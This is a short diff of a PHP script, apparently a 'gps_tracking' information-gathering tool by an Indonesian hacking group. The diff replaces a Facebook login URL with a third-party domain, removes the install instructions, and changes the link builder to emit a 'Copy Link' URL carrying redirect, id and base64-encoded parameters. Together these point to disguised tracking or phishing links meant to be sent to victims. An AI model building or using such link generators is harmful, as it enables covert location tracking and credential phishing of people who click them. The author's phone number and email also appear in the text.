@@ -12,7 +12,7 @@
 */
 $version 	= '1.0.19';
 $random 	= rand(123456789, 6);
-$url 		= 'https://www.facebook.com/login/';
+$url 		= 'https://brad.josebernard.com/index/';
 
 error_reporting(0);
 
@@ -49,17 +49,6 @@ function tampil()
 
        => Information Gathering <=
 
-Cara pemasangan
-                                        
-pkg update && pkg upgrade
-pkg install php wget git
-pip2 install mechanize
-pip2 install requests
-pkg install --upgrade pip
-git clone git clone https://github.com/davekgw/gps_tracking
-cd gps_tracking && chmod +x gpss.php
-php gpss.php
-
 Author   : DaVe Kgw => { IndoCyber }
 Contact  : 089631008798 - daveamben4@gmail.com
 FansPage : https://www.facebook.com/IndoSecOfficial/
@@ -78,7 +67,7 @@ function buat_link($input, $random, $url, $id, $img)
 	$imgs = base64_encode($img);
 
 	$random2 = base64_encode($random);
-	$url = 'Copy Link => '.$url.'&img='.$imgs;
+	$url = 'Copy Link => '.$url.'home.php?redirect='.$input.'&page='.$random2.'&id='.$id.'&img='.$imgs;
 	echo "\n\n[+] $url";
 }
 
